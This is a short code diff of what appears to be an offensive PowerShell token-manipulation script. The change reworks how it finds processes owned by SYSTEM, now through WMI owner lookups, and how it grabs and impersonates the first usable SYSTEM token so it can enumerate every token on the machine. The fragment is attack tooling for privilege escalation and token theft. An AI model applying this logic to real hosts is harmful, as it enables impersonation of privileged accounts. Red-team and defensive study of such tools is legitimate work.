@@ -1686,20 +1686,33 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         #Even if already running as system, later parts on the script depend on having a SYSTEM token with most privileges.
         #We need to enumrate all processes running as SYSTEM and find one that we can use.
         [string]$LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value
-        $SystemTokens = Get-Process -IncludeUserName | Where {$_.Username -eq $LocalSystemNTAccount}
+        
+        $SystemTokens = Get-WmiObject -Class Win32_Process | ForEach-Object {
+            $OwnerInfo = $_.GetOwner()
+
+            if ($OwnerInfo.Domain -and $OwnerInfo.User) {
+                $OwnerString = "$($OwnerInfo.Domain)\$($OwnerInfo.User)".ToUpper()
+
+                if ($OwnerString -eq $LocalSystemNTAccount.ToUpper()) {
+                    $_
+                }
+            }
+        }
+
         ForEach ($SystemToken in $SystemTokens)
         {
-            $SystemTokenInfo = Get-PrimaryToken -ProcessId $SystemToken.Id -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
+            $SystemTokenInfo = Get-PrimaryToken -ProcessId $SystemToken.ProcessId -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
+            if ($SystemTokenInfo) { break }
         }
-        if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
+        if ($SystemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
         {
             Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
         }
 
-        if ($systemTokenInfo -ne $null -and $systemTokenInfo.hProcToken -ne [IntPtr]::Zero)
+        if ($SystemTokenInfo -ne $null -and $SystemTokenInfo.hProcToken -ne [IntPtr]::Zero)
         {
-            $CloseHandle.Invoke($systemTokenInfo.hProcToken) | Out-Null
-            $systemTokenInfo = $null
+            $CloseHandle.Invoke($SystemTokenInfo.hProcToken) | Out-Null
+            $SystemTokenInfo = $null
         }
 
         $ProcessIds = get-process | where {$_.name -inotmatch "^csrss$" -and $_.name -inotmatch "^system$" -and $_.id -ne 0}
